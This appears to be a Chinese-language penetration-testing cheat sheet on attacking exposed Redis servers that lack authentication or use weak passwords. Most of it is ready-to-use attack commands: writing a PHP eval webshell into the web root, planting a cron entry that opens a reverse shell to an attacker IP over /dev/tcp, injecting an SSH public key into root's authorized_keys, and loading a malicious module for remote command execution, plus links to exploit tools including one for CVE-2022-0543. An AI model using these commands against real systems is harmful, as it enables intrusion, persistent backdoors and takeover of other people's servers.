# Redis 漏洞利用
## 0x00 Introduction
redis是一个key-value存储系统。   

### 前置条件      
获取redis权限
- 未授权
- 弱口令

### 达成的漏洞利用效果
- 写任意文件
- 信息泄露
- 远程命令执行

## 0x01 漏洞利用

### 1. 信息泄露

#### (1)info命令

可以泄露操作系统信息，以此为后续漏洞利用做准备。   

### 2. 写任意文件->RCE

#### (1) 新建DB写文件->webshell
附件条件：
1. 同主机存在web服务
2. 已知网站路径
3. 具备写权限 
    
```
config set dir /var/www/html    
config set dbfilename webshell.php  
set shell "<?php @eval($_POST['shell']);?>"  
save  
```
#### (2) 新建DB写文件->计划任务反弹shell

```
redis-cli -h 192.168.1.11
config set dir /var/spool/cron
set re "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/x.x.x.x/8899 0>&1\n\n"
config set dbfilename root
save
```

#### (3) 新建DB写文件->公钥SSH连接
```
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > re.txt
```
```
cat re.txt | redis-cli -h 192.168.1.11 -x set re
config set dir /root/.ssh
config set dbfilename authorized_keys
save
```
本地连接：
```
ssh  -o StrictHostKeyChecking=no 192.168.1.1
```
### 3. 远程命令执行

#### (1) 主从同步->RCE
- 附加条件： redis 4.x-5.0.5
- 在Redis 4.x之后，Redis新增了模块功能，通过外部拓展，可以在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。  

#### Linux
- 漏洞利用： https://github.com/Ridter/redis-rce
- linux 命令执行模块（so）：https://github.com/RicterZ/RedisModules-ExecuteCommand.

redis-rce工具一键利用    
#### Windows
- 漏洞利用：https://github.com/r35tart/RedisWriteFile
- windows 命令执行模块（dll）:https://github.com/0671/RedisModules-ExecuteCommand-for-Windows

```
python RedisWriteFile.py --auth 123qwe --rhost=10.20.3.97 --rport=6379 --lhost=10.10.10.31 --lport=2222 --rpath="C:\Users\test\Desktop" --rfile="exp.dll" --lfile="exp.dll" 

redis:
>module load C:\Users\test\Desktop\exp.dll 
>exp.e whoami
```
#### (2) Redis沙盒绕过（CVE-2022-0543）
- 附加条件： 2.2 <= redis < 5.0.13，2.2 <= redis < 6.0.15，2.2 <= redis < 6.2.5
- 漏洞利用：https://github.com/aodsec/CVE-2022-0543

## Ref
- https://www.freebuf.com/column/237263.html
